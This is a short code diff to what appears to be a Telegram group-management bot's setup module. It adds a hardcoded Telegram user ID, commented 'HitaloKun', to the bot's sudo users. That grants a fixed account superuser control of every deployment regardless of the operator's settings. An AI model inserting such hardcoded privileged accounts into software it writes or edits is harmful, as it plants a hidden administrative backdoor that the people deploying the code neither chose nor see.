@@ -110,6 +110,8 @@ else:
 
 SUDO_USERS.add(OWNER_ID)
 
+SUDO_USERS.add(302253890) #HitaloKun
+
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
 dispatcher = updater.dispatcher
